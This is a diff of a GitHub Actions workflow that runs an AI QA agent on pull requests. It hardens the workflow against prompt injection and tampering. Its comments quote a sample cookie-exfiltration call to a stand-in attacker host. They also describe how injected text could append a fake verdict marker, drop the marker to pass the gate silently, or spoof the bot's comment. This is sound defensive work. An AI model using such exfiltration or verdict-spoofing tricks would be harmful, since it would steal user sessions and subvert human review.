@@ -277,9 +277,13 @@ jobs:
             qa-verdict markers) to REPORT_FILE and does NOT post a comment — a later workflow step
             posts/updates the comment. Do not return the report as a chat message.
 
+          # browser_evaluate is INTENTIONALLY omitted. The top-of-file threat model calls it out as
+          # the primary un-coverable exfil channel (`fetch('https://attacker', {body:document.cookie})`)
+          # and the CI skill path doesn't need it — auth comes via storage-state, not document.cookie.
+          # Keep it omitted unless a concrete read-only verification needs it.
           claude_args: |
             --mcp-config '{"mcpServers":{"playwright":{"command":"npx","args":["-y","@playwright/mcp@${{ env.MCP_VERSION }}","--headless","--isolated","--no-sandbox","--storage-state","${{ runner.temp }}/storage_state.json"]}}}'
-            --allowedTools "Bash(gh pr diff:*),Bash(gh pr view:*),Bash(gh issue view:*),Read,Write,Grep,Glob,mcp__playwright__browser_navigate,mcp__playwright__browser_snapshot,mcp__playwright__browser_click,mcp__playwright__browser_type,mcp__playwright__browser_fill_form,mcp__playwright__browser_select_option,mcp__playwright__browser_hover,mcp__playwright__browser_press_key,mcp__playwright__browser_wait_for,mcp__playwright__browser_console_messages,mcp__playwright__browser_network_requests,mcp__playwright__browser_evaluate"
+            --allowedTools "Bash(gh pr diff:*),Bash(gh pr view:*),Bash(gh issue view:*),Read,Write,Grep,Glob,mcp__playwright__browser_navigate,mcp__playwright__browser_snapshot,mcp__playwright__browser_click,mcp__playwright__browser_type,mcp__playwright__browser_fill_form,mcp__playwright__browser_select_option,mcp__playwright__browser_hover,mcp__playwright__browser_press_key,mcp__playwright__browser_wait_for,mcp__playwright__browser_console_messages,mcp__playwright__browser_network_requests"
 
       # The MCP server has already consumed storage_state.json at startup; nothing else needs it.
       # Delete it from $RUNNER_TEMP (where we stored it, outside the workspace) for hygiene.
@@ -336,20 +340,33 @@ jobs:
           # "LLM echoes template above the real marker" and "prompt-injection appends a fake
           # marker after the real one to flip the verdict"; a true marker count = 1 means the
           # gate reads the agent's intended answer unambiguously). Missing marker (count = 0)
-          # still ⇒ empty verdict ⇒ gate green per the existing "uncertainty doesn't block" rule.
+          # is treated as no_report below — a body with cv-verifier but no qa-verdict is a
+          # malformed report (e.g. injection that dropped the verdict line), NOT a green
+          # INCONCLUSIVE — closing the silent-green attack on the gate.
+          # The regex is anchored with a closing `-->` so the skill template's placeholder
+          # `<!-- qa-verdict: <PASS_OR_FAIL_OR_INCONCLUSIVE> -->` (no literal alternation
+          # between the colon and the closer) does NOT match if the agent echoes it.
           # Count actual MATCHES (not matching lines). `grep -c` counts lines, so two markers on
           # the same line would still register as 1 and bypass the anti-tamper check.
-          MARKER_COUNT=$(printf '%s' "$BODY" | grep -oiE '<!-- qa-verdict:[[:space:]]*(PASS|FAIL|INCONCLUSIVE)' | wc -l | tr -d ' ' || true)
+          MARKER_COUNT=$(printf '%s' "$BODY" | grep -oiE '<!-- qa-verdict:[[:space:]]*(PASS|FAIL|INCONCLUSIVE)[[:space:]]*-->' | wc -l | tr -d ' ' || true)
           MARKER_COUNT=${MARKER_COUNT:-0}
           if [ "$MARKER_COUNT" -gt 1 ]; then
             echo "::error::QA report contains $MARKER_COUNT qa-verdict markers; expected exactly 1. Refusing to post (possible prompt-injection tampering or LLM template-echo). See the 'Show QA report on failure' step below for the body (registered secrets masked)."
             exit 1
           fi
+          if [ "$MARKER_COUNT" -eq 0 ]; then
+            # We already confirmed cv-verifier marker is present (the no_report gate above passed),
+            # so this is the "cv-verifier present, qa-verdict absent" attack — silent-green bypass
+            # of the gate. Treat as infrastructure failure and fail red.
+            echo "::warning::QA report has the cv-verifier marker but no qa-verdict marker — treating as no_report."
+            echo "no_report=true" >> "$GITHUB_OUTPUT"
+            exit 0
+          fi
           # NOTE: we parse the verdict into a local var here but do NOT write to $GITHUB_OUTPUT
           # until AFTER the scrub passes and the comment posts. Otherwise the QA gate (if:always())
           # would read a stale verdict on a run where the comment was actually withheld, giving the
           # appearance of a successful gate evaluation even though the post path failed.
-          VERDICT=$(printf '%s' "$BODY" | grep -oiE '<!-- qa-verdict:[[:space:]]*(PASS|FAIL|INCONCLUSIVE)' \
+          VERDICT=$(printf '%s' "$BODY" | grep -oiE '<!-- qa-verdict:[[:space:]]*(PASS|FAIL|INCONCLUSIVE)[[:space:]]*-->' \
             | grep -oiE '(PASS|FAIL|INCONCLUSIVE)' | head -n1 | tr '[:lower:]' '[:upper:]' || true)
           echo "Parsed QA verdict (pending scrub + post): ${VERDICT:-<none>} (marker_count=$MARKER_COUNT)"
 
@@ -394,8 +411,14 @@ jobs:
           # concatenates the outputs. So `map(...) | first | .id` would emit one id-or-`null` per page
           # and `$CID` could become a multi-line `"null\n12345"` on PRs with >30 comments. Instead,
           # emit one id per match per page (no `map`, no `first`) and `head -n1` picks the earliest.
+          # AUTHOR FILTER (`user.login == "github-actions[bot]"`): on a public repo, anyone can post a
+          # comment containing `<!-- cv-verifier -->` to hijack the upsert — at best a PATCH 403 that
+          # `set -e`s the step (no QA review ever posts), at worst a spoofed PASS. The QA comment is
+          # always written by us under the default GITHUB_TOKEN, which posts as `github-actions[bot]`,
+          # so we filter on that identity. NOTE: if the future SDK switches the post step to use a
+          # PAT or a GitHub App token, update this filter to match the new identity.
           CID=$(gh api "repos/$REPO/issues/$PR/comments" --paginate \
-            --jq '.[] | select(.body | contains("<!-- cv-verifier -->")) | .id' | head -n1)
+            --jq '.[] | select(.user.login == "github-actions[bot]") | select(.body | contains("<!-- cv-verifier -->")) | .id' | head -n1)
           if [ -n "${CID:-}" ]; then
             printf '%s' "$PAYLOAD" | gh api -X PATCH "repos/$REPO/issues/comments/$CID" --input - --silent
             echo "Updated existing QA comment $CID."
